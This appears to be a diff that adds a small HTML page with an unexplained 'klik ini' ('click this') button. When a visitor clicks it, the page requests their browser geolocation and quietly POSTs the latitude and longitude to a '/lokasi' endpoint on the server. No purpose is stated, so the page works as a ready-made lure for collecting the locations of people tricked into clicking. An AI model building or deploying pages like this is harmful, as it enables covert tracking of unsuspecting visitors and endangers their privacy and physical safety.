@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fuck yourself</title>
+    <style>
+        *{
+            border: none;
+        }
+        #btn{
+            margin-left: 50%;
+            margin-top: 20vh;
+            padding: 10px;
+            width: 100px;
+            height: 40px;
+            border-radius: 4px;
+            background-color: rgb(211, 86, 211);
+            color: white;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        #btn:hover{
+            background-color: blueviolet;
+        }
+        #geolocation-info {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <button id="btn">klik ini</button>
+    <div id="geolocation-info">
+        <p id="user-agent-info"></p>
+        <p id="location-info"></p>
+    </div>
+    <script>
+        var btn = document.getElementById('btn');
+        var geolocationInfo = document.getElementById('geolocation-info');
+        var userAgentInfo = document.getElementById('user-agent-info');
+        var locationInfo = document.getElementById('location-info');
+        
+        btn.addEventListener('click', () => {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+                    var userAgent = navigator.userAgent;
+                    
+                    // Sembunyikan tombol
+                    btn.style.display = 'none';
+                    
+                    // Tampilkan informasi geolocation dan user agent
+                    geolocationInfo.style.display = 'block';
+                    userAgentInfo.textContent = "User Agent: " + userAgent;
+                    locationInfo.textContent = "Latitude: " + latitude + ", Longitude: " + longitude;
+                    
+                    // Kirim data ke server menggunakan fetch
+                    fetch('/lokasi', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ latitude, longitude })
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        console.log('Data berhasil dikirim ke server:', data);
+                    })
+                    .catch(error => {
+                        console.error('Ada kesalahan:', error);
+                    });
+
+                }, function(error) {
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            // Tampilkan pesan bahwa izin ditolak
+                            console.error("Izin untuk mendapatkan lokasi ditolak.");
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            console.error("Informasi lokasi tidak tersedia.");
+                            break;
+                        case error.TIMEOUT:
+                            console.error("Waktu permintaan lokasi habis.");
+                            break;
+                        case error.UNKNOWN_ERROR:
+                            console.error("Terjadi kesalahan yang tidak diketahui.");
+                            break;
+                    }
+                });
+            } else {
+                console.error("Geolocation tidak didukung oleh browser ini.");
+            }
+        });
+    </script>
+</body>
+</html>
